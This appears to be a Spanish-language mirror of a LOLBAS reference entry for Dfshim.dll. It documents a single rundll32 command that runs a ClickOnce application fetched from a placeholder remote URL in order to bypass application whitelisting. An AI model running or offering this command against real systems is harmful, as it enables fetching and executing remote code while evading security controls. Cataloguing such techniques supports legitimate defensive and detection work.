# LOLBAS: Dfshim.dll

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `AWL Bypass`

ClickOnce engine in Windows used by .NET

## Comandos

### Use binary to bypass Application whitelisting

AWL Bypass · priv: User · T1127.002

```cmd
rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
```

Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)

